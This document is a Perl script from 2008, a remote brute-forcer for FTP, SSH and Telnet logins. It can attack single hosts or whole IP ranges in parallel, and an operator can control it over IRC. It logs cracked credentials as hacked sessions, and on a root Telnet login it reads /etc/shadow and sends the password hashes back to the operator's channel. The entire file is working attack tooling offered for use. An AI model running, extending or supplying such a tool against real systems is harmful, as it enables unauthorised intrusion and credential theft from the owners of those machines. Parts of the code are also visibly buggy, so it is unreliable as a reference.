#!/usr/bin/perl

# Copyright (C) 2008 by Osirys
# Remote Bruter k7
# Greets to : Mic22
# Contact : osirys[at]live[dot]it
# [!] Don't ask -~-~~>> Understand the c0de >>

# Get modules at cpan.org 

use IO::Socket::INET;
use Parallel::ForkManager;
use Net::FTP;
use Net::SSH2;
use Net::Telnet ();

########### CONFIGURATION
############################

### Standard

my %services = (
    'ftp'    => 21,   21   => 'ftp',
    'ssh'    => 22,   22   => 'ssh',
    'telnet' => 23,   23   => 'telnet',
);

my $max_proc = 100; # Put here the maximum process for the cracking activity
# If you are using it on a low machine, put a number << 100 (ex: 50)

### Default Usernames/Password for the bruter

my @usernames = qw(admin lol we jdjd www eee);
my @passwords = qw(admin oo lld);

########### Start :D
############################

print q{
  =============================
  |    _ Remote Bruter k7 _   |
  |         by Osirys         |
  =============================
};

my $mode = $ARGV[0];

CASES : {
            &usage(), last CASES if (!$ARGV[0]);
            $kprint = 0,&bash_mode(), last CASES if ($mode =~ /bash-mode/);
            &usage(), last CASES if (($mode =~ /irc-mode/)&&(!$ARGV[1])|(!$ARGV[2])|(!$ARGV[3])|(!$ARGV[4]));
            $kprint = 1,&irc_mode($ARGV[1],$ARGV[2],$ARGV[3],$ARGV[4]), last CASES if (($mode =~ /irc-mode/)&&(($ARGV[1])||($ARGV[2])||($ARGV[3])||($ARGV[4])));
            &help(), last CASES if ($mode =~ /help/);
        }

sub help() {

print "                           --- HELP ---                                 \n".
      " If you have a direct command line on the server where you are launching\n".
      " the script, like you are in with a bash shell, you can just use the    \n".
      " bash mode. Unless, if you can't have a direct command line, launch it  \n".
      " in irc-mode, so you will command the script under Irc.                 \n".
      " !! ATTENTION !!                                                        \n".
      " This is a private tool, please, don't distribute it.                   \n".
      " Thank you                                                              \n".
      " By Osirys                                                              \n";

};
    &usage;
}

sub usage() {
    print "\n\nUsage:\n";
    print " [+] perl $0 bash-mode - FOR A SHELL USE\n";
    print " [+] perl $0 irc-mode server port nick chan - FOR IRC USE\n";
    print " [+] perl $0 help - FOR HELP\n";
    print "[©] Coded by Osirys\n\n";
    exit(1);
}

sub bash_mode() {
    open($file, ">", ".tmp.txt");
    print $file "x";
    close($file);
    &help_b;
    chomp($line = <STDIN>);
    cheek($line);
}

sub irc_mode() {
    my ($ircd, $port, $nick, $chan) = @_;
    if (fork() == 0) {
        print "\n[+] Connecting on:\nServer/Port: $ircd:$port\nNick: $nick\nChannel: #$chan\n# Coded by Osirys\n\n";
        irc($ircd, $port, $nick, $chan);
    }
    else {
        exit(0);
    }
}

sub irc() {
    ($ircd, $port, $nick, $chan) = @_;
    $chan =~ s/(.+?)/\#$1/;
    $c0n = IO::Socket::INET->new(PeerAddr => "$ircd",PeerPort => "$port",Proto => "tcp") || die "[-] Can not connect on $ircd:$port ! Try again later !\n";
    $c0n->autoflush(1);
    print $c0n "NICK $nick\n";
    print $c0n "USER rBruter 8 *  : Osirys\n";
    print $c0n "JOIN $chan\n";
    open($file, ">", ".tmp.txt");
    print $file "x";
    close($file);
    wr($chan,"15,1/_ r_Bruter k7 ready !!");
    wr($chan,"11,1© Coded by Osirys");
    while ($line = <$c0n>) {
        $m00de = "irc";
        $def_var = 0;
        cheek($line);
    }
}

sub cheek() {
    my $line = $_[0];
    if ($line =~ /^PING \:(.*)/) {
        print $c0n "PONG :$1";
    }
    elsif ($line =~ /\.help/) {
        if ($kprint == 0) {
            &help_b;
        }
        elsif ($kprint == 1) {
            wr($chan,"9,1.help 4,1>7,1 For Help");
            wr($chan,"9,1.single ip service 4,1>7,1 To start to brute a service on a single ip (Ex: .single 127.0.0.1 ftp");
            wr($chan,"9,1.m-single ip 4,1>7,1 To start to brute all the services activated on a single ip (Ex: !.m-single 127.0.0.1)");
            wr($chan,"9,1.range ip_range service 4,1>7,1 To start to brute a service on a range of ip (Ex: .range 192.168.1 ftp)");
            wr($chan,"9,1.m-range ip_range 4,1>7,1 To start to brute all the services activated on the range of ip (Ex: .m-range 192.168.1)");
            wr($chan,"9,1.services 4,1>7,1 Get the list of the avaiable service to brute");
            wr($chan,"9,1.exit 4,1>7,1 Kill the Bot");
        }
    }
    elsif ($line =~ /\.exit/) {
        print_cheek("[-] Bye Bye!!");
        print $c0n "QUIT";
        exec("pkill perl");
    }
    elsif ($line =~ /\.services/) {
        wr($chan,"11,1[+] Avaiable services");
        wr($chan," 7,1 1 - Ftp Scan    (Port 21)");
        wr($chan," 7,1 2 - Ssh Scan    (Port 22)");
        wr($chan," 7,1 3 - Telnet Scan (Port 23)");
    }
    elsif ($line =~ /\.single ([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}) (ftp|ssh|telnet)/) {
        my $service = $5;
        if (($1 >= 0)&&($1 <= 255)&&($2 >= 0)&&($2 <= 255)&&($3 >= 0)&&($3 <= 255)&&($4 >= 0)&&($4 <= 255)) {
            my $ip = $1.".".$2.".".$3.".".$4;
            $smode = "single";
            single_scan($ip,$service);
        }
        else {
            print_cheek("[-] Bad ip address");
        }
    }
    elsif ($line =~ /\.m-single ([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/) {
        if (($1 >= 0)&&($1 <= 255)&&($2 >= 0)&&($2 <= 255)&&($3 >= 0)&&($3 <= 255)&&($4 >= 0)&&($4 <= 255)) {
            my $ip = $1.".".$2.".".$3.".".$4;
            $smode = "mass";
            single_scan($ip);
        }
        else {
            print_cheek("[-] Bad ip address");
        }
    }
    elsif ($line =~ /\.range ([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}) (ftp|ssh|telnet)/) {
        my $service = $4;
        if (($1 >= 0)&&($1 <= 255)&&($2 >= 0)&&($2 <= 255)&&($3 >= 0)&&($3 <= 255)) {
            my $ip = $1.".".$2.".".$3;
            $smode = "s-mass";
            range_scan($ip,$service);
        }
        else {
            print_cheek("[-] Bad ip address");
        }
    }
    elsif ($line =~ /\.m-range ([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/) {
        if (($1 >= 0)&&($1 <= 255)&&($2 >= 0)&&($2 <= 255)&&($3 >= 0)&&($3 <= 255)) {
            my $ip = $1.".".$2.".".$3;
            $smode = "mass";
            range_scan($ip);
        }
        else {
            print_cheek("[-] Bad ip address");
        }
    }
    else {
        if ($kprint == 0) {
            print "[-] Error !\n";
        }
    }
}

sub single_scan() {
    my $ip      = $_[0];
    my $service = $_[1];
    if ($smode =~ /single/) {
        $response = port_scan($ip,"single-port",$services{$service});
        $response == 1 || alert("[-] $ip has not the $services{$service} port opened !\n[-] Bruting stopped !");
        $def_var != 1 || return;
        cheek_service($ip,$service);
    }
    elsif ($smode =~ /mass/) {
        @port_t = port_scan($ip,"mass-port");
        while ($p = <@port_t>) {
            cheek_service($ip,$p);
        }
    }
}

sub range_scan() {
    my $range   = $_[0];
    my $service = $_[1];
    my $count = 0;
    if ($smode =~ /s-mass/) {
        print_cheek("[+] Creating ip range to brute on ..");
        open($ff, "<", "ip.txt");
        while (my $ip = <$ff>) {
            $ip =~ s/x\.y\.z/$range/;
            $ip =~ s/\n//;
            push(@ips,$ip);
        }
        close($ff);
        print_cheek("[+] Port Scanning for $services{$service} port on $range range started !");
        foreach my $ip(@ips) {
            $count++;
            if ($count %64 == 0) {
                count_ip($count);
            }
            $response = port_scan($ip,"range-scan",$services{$service});
            if ($response == 1) {
                cheek_service($ip,$service);
            }
        }
        print_cheek("[-] Range Scan on $range finished !");
    }
}

sub cheek_service() {
    my $ip      = $_[0];
    my $service = $_[1];
    if (($service eq $services{21})||($service eq $services{"ftp"})) {
        print_cheek("[+] Ftp Bruting started on $ip:21");
        $out_type = 0;
        $ch = ftp_brute($ip);
        if ($ch == 1) {
            return;
        }
    }
    elsif (($service eq $services{22})||($service eq $services{"ssh"})){
        print_cheek("[+] Ssh Bruting started on $ip:22");
        $out_type = 0;
        $ch = ssh_brute($ip);
        if ($ch == 1) {
            return;
        }
    }
    elsif (($service eq $services{23})||($service eq $services{"telnet"})) {
        print_cheek("[+] Telnet Bruting started on $ip:23");
        $out_type = 1;
        $ch = telnet_brute($ip);
        if ($ch == 1) {
            return;
        }
    }
}

sub ftp_brute() {
    my $ip = $_[0];
    foreach my $u(@usernames) {
        my $pm = new Parallel::ForkManager($max_proc);
        foreach my $p(@passwords) {
            $pm->start and next;
            $ftp = Net::FTP->new($ip);
            if ($ftp) {
                my $banner = $ftp->message;
                if ($ftp->login($u,$p)) {
                    gotcha("ftp",$ip,$u,$p,$banner);
                }
            }
            $ftp->quit;
            $pm->finish;
        }
        $pm->wait_all_children;
    }
    cheek_f($ip,"ftp");
    `rm -rf .tmp.txt`;
    open($file, ">", ".tmp.txt");
    print $file "x";
    close($file);
    if (($m00de =~ /irc/)||($smode !~ /single/)) {
        print_cheek("[-] Ftp Bruting finished on $ip:21");
        return;
    }
    else {
        exit(0);
    }
}

sub ssh_brute() {
    my $ip = $_[0];
    foreach my $u(@usernames) {
        my $pm = new Parallel::ForkManager($max_proc);
        foreach my $p(@passwords) {
            $pm->start and next;
            $ssh =  Net::SSH2->new();
            if ($ssh->connect($ip)) {
                if ($ssh->auth(username => $u, password => $p)) {
                    #my $command = $ssh->exec("uname -a");
                    gotcha("ssh",$ip,$u,$p,$command);
                }
            }
            $pm->finish;
        }
        $pm->wait_all_children;
    }
    cheek_f($ip,"ssh");
    `rm -rf .tmp.txt`;
    open($file, ">", ".tmp.txt");
    print $file "x";
    close($file);
    if (($m00de =~ /irc/)||($smode !~ /single/)) {
        print_cheek("[-] Ssh Bruting finished on $ip:22");
        return;
    }
    else {
        exit(0);
    }
}

sub telnet_brute() {
    my $ip = $_[0];$vg0t = 1;
    foreach my $u(@usernames) {
        my $pm = new Parallel::ForkManager($max_proc);
        foreach my $p(@passwords) {
            $pm->start and next;
            $telnet = new Net::Telnet (Host => $ip, Timeout => 5);
            if ($telnet) {
                if ($telnet->login($u, $p)) {
                    @command = $telnet->cmd("whoami");
                    while (my $e = <@command>) {
                        if ($e eq "root") {
                            @sha = $telnet->cmd("cat /etc/shadow");
                            unshift @sha, 'Root access found ! cat /etc/shadow';
                            gotcha("telnet",$ip,$u,$p,@sha);
                        }
                        else {
                            gotcha("telnet",$ip,$u,$p,@command);
                        }
                    }
                }
            }
            $telnet->close;
            $pm->finish;
        }
        $pm->wait_all_children;
    }
    cheek_f($ip,"telnet");
    `rm -rf .tmp.txt`;
    open($file, ">", ".tmp.txt");
    print $file "x";
    close($file);
    if (($m00de =~ /irc/)||($smode !~ /single/)) {
        print_cheek("[-] Telnet Bruting finished on $ip:22");
        return;
    }
    else {
        exit(0);
    }
}

sub port_scan() {
    my $ip    = $_[0];
    my $mode  = $_[1];
    my $port  = $_[2];
    if ($mode =~ /single-port/) {
        my $socket = IO::Socket::INET->new(PeerAddr => $ip,PeerPort => $port,Proto => "tcp",Timeout => 5) || alert("[-] Can't enstablish a connection with $ip:$port");
        $def_var != 1 || return;
        if ($socket){
            print_cheek("[+] Port $port on $ip is opened, bruting started !");
            $response = 1;
        }
        close $socket;
        return $response;
    }
    elsif ($mode =~ /range-scan/) {
        my $socket = IO::Socket::INET->new(PeerAddr => $ip,PeerPort => $port,Proto => "tcp",Timeout => 2) || return;
        if ($socket){
            print_cheek("[+] Port $port on $ip is opened, bruting started !");
            $response = 1;
        }
        close $socket;
        return $response;
    }
    elsif ($mode =~ /mass-port/) {
        print_cheek("[+] Let's scan for opened ports..");
        foreach my $p(@ports) {
            my $socket = IO::Socket::INET->new(PeerAddr => $ip,PeerPort => $p,Proto => "tcp");
            if ($socket){
                print_cheek("[+] Port $p on $ip is open");
                push(@ports_t,$p);
            }
            close $socket;
        }
        return @ports_t;
    }
}

sub gotcha() {
    if ($out_type == 0) {
        my $serv = $_[0];
        my $host = $_[1];
        my $user = $_[2];
        my $pass = $_[3];
        $info = $_[4];
        $info =~ s/\n/\. /g;
        open($file, ">>", "log.txt");
        if ($info !~ //) {
            print $file "Session hacked :\n  Host: $host:$services{$serv}\n  Username: $user\n  Password: $pass\n  Info: $info\n\n";
        }
        else {
            print $file "Session hacked :\n  Host: $host:$services{$serv}\n  Username: $user\n  Password: $pass\n  Info: Can't grab more info\n\n";
        }
        close($file);
        open($tmp, ">", ".tmp.txt");
        print $tmp "1\n";
        close($tmp);
        print_cheek("[*] Session Hacked:");
        print_cheek(" Host:     $host:$services{$serv}");
        print_cheek(" Username: $user");
        print_cheek(" Password: $pass");
        if ($info !~ //) {
            print_cheek(" Info: $info");
        }
    }
    elsif ($out_type == 1) {
        ($serv,$host,$user,$pass,@inf0) = @_;
        my $count = 0;
        foreach my $a(@inf0) {
            $count++;
            $a =~ s/\n//;
            push(@inf_o,$a);
        }
        open($file, ">>", "log.txt");
        if ($count > 0) {
            print $file "Session hacked :\n  Host: $host:$services{$serv}\n  Username: $user\n  Password: $pass\n  Info:\n";
            foreach my $i(@inf_o) {
                print $file "   $i\n";
            }
        }
        else {
            print $file "Session hacked :\n  Host: $host:$services{$serv}\n  Username: $user\n  Password: $pass\n  Info: Can't grab more info\n\n";
        }
        close($file);
        open($tmp, ">", ".tmp.txt");
        print $tmp "1\n";
        close($tmp);
        print_cheek("[*] Session Hacked:");
        print_cheek(" Host:     $host:$services{$serv}");
        print_cheek(" Username: $user");
        print_cheek(" Password: $pass");
        if ($count > 0) {
            print_cheek(" Info:");
            foreach my $i(@inf_o) {
                print_cheek("  $i");
            }
        }
    }
}

sub cheek_f() {
    my $ip      = $_[0];
    my $service = $_[1];
    open($file, "<", ".tmp.txt");
    while (my $a = <$file>) {
        if ($a != 1) {
            print_cheek("[-] Bruting on $ip:$services{$service} failed");
        }
    }
}

sub help_b {
    print "[h] Commands and examples :                                                     \n".
          " Ex: .single   127.0.0.1 telnet # Start bruting on 127.0.0.1:23                 \n".
          " Ex: .m-single 127.0.0.1        # Start bruting all active services on 127.0.0.1\n".
          " Ex: .range    192.168.1 ssh    # Start bruting class 192.168.1 on 22 port      \n".
          " Ex: .m-range  192.168.1        # Start bruting all active services on the range\n".
          " ===== Avaiable services                                                        \n".
          "  Ftp Scan     (Port 21)                                                        \n".
          "  Ssh Scan     (Port 22)                                                        \n".
          "  Telnet Scan  (Port 23)                                                        \n".
          " =====                                                                          \n";
}

sub count_ip() {
    my $count = $_[0];
    if ($count == 64) {
        print_cheek("[%] 25 % of total scan done !");
    }
    elsif ($count == 128) {
        print_cheek("[%] 50 % of total scan done !");
    }
    elsif ($count == 192) {
        print_cheek("[%] 75 % of total scan done !");
    }
    elsif ($count == 256) {
        print_cheek("[%] 100 % of total scan done !");
    }
}

sub print_cheek() {
    my $message    = $_[0];
    if ($kprint == 0) {
        print "$message\n";
    }
    elsif ($kprint == 1) {
        $m3ss = chmess($message);
        wr($chan,$m3ss);
    }
}

sub alert() {
    my $message = $_[0];
    if ($kprint == 0) {
        print "$message\n";
        exit(0);
    }
    elsif ($kprint == 1) {
        $def_var = 1;
        $m3ss = chmess($message);
        print $c0n "PRIVMSG $chan :$m3ss\n";
        return;
    }
}

sub wr() {
    my $chan = $_[0];
    my $cont = $_[1];
    print $c0n "PRIVMSG $chan :$cont\n";
}

sub chmess() {
    my $message = $_[0];
    if ($message =~ /\[%\]|\[i\]/) {
        $m3ss = "7,1".$message."";
    }
    elsif ($message =~ /\[\-\]/) {
        $m3ss = "4,1".$message."";
    }
    elsif ($message =~ /\[\*\]/) {
        $m3ss = "15,1".$message."";
    }
    elsif ($message =~ /^ /) {
        $m3ss = "11,1".$message."";
    }
    elsif ($message =~ /\[\+\]/) {
        $m3ss = "9,1".$message."";
    }
    return $m3ss;
}

sub sgot {
    $vg0t = 0;
}

## Copyright (C) 2008 by Osirys